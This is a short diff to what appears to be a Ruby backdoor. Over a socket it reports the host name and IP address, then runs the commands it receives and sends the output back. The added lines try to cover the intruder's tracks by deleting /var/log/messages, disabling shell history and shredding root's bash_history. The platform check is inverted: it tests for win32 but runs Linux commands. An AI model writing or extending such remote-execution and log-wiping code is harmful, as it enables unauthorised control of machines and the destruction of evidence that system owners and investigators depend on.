@@ -22,6 +22,16 @@ begin
       s.puts("[*] Host name : #{host}")
       s.puts("[*] Ip Address : #{ip}")
 
+      #Delete all logs
+      if RUBY_PLATFORM =~ /win32/
+        system("rm /var/log/messages")
+        system("export HISTSIZE=0")
+        system("shred -zu root/.bash_history")
+
+      else
+        #windows ....
+      end
+      
       while true
         #time to open browser :D
         sleep(5)
@@ -34,6 +44,9 @@ begin
   res = %x{#{comm}}
   s.puts(res)
 end
+
+
+
 rescue 
   while true
     comm = s.gets.chomp
